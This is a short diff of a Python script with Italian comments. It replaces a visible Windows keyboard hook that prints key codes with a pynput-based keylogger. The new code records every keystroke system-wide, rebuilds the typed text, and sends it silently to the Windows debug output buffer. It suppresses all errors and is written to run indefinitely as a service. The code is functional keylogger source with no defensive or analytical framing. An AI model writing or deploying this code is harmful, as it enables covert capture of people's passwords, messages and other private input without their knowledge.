@@ -1,44 +1,44 @@
 import ctypes
-from ctypes import wintypes
 import time
+from pynput import keyboard
 
-# Caricamento librerie di sistema
-user32 = ctypes.WinDLL('user32', use_last_error=True)
-kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+# Funzione per inviare la stringa al buffer di debug di Windows
+def log_to_debug(message):
+    try:
+        # OutputDebugStringW accetta stringhe Unicode
+        ctypes.windll.kernel32.OutputDebugStringW(message)
+    except Exception as e:
+        pass
 
-# Definizioni costanti Windows
-WH_KEYBOARD_LL = 13
-WM_KEYDOWN = 0x0100
+def on_press(key):
+    try:
+        # Tenta di leggere il carattere
+        if hasattr(key, 'char') and key.char is not None:
+            msg = key.char
+        else:
+            # Gestione tasti speciali
+            if key == keyboard.Key.space:
+                msg = " "
+            elif key == keyboard.Key.enter:
+                msg = "\n"
+            else:
+                msg = f"[{key}]"
+        
+        log_to_debug(msg)
+    except Exception:
+        pass
 
-def low_level_handler(nCode, wParam, lParam):
-    if nCode >= 0 and wParam == WM_KEYDOWN:
-        vk_code = lParam.contents.vkCode
-        # Stampa il codice virtuale del tasto
-        print(f"Tasto intercettato (VK): {vk_code}")
-    return user32.CallNextHookEx(None, nCode, wParam, lParam)
+def main():
+    # Avvia il listener in un thread separato
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    
+    # Mantiene il processo in esecuzione (necessario per un servizio)
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        listener.stop()
 
-# Struttura dati per il tasto
-class KBDLLHOOKSTRUCT(ctypes.Structure):
-    _fields_ = [("vkCode", wintypes.DWORD),
-                ("scanCode", wintypes.DWORD),
-                ("flags", wintypes.DWORD),
-                ("time", wintypes.DWORD),
-                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]
-
-# Registrazione dell'hook
-CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, ctypes.POINTER(KBDLLHOOKSTRUCT))
-pointer = CMPFUNC(low_level_handler)
-
-hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)
-
-if not hook:
-    print("Impossibile installare l'hook, m'Lord.")
-    exit(1)
-
-print("Hook installato. In attesa di input globale...")
-
-# Ciclo dei messaggi necessario per far funzionare l'hook
-msg = wintypes.MSG()
-while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
-    user32.TranslateMessage(ctypes.byref(msg))
-    user32.DispatchMessageW(ctypes.byref(msg))
+if __name__ == "__main__":
+    main()
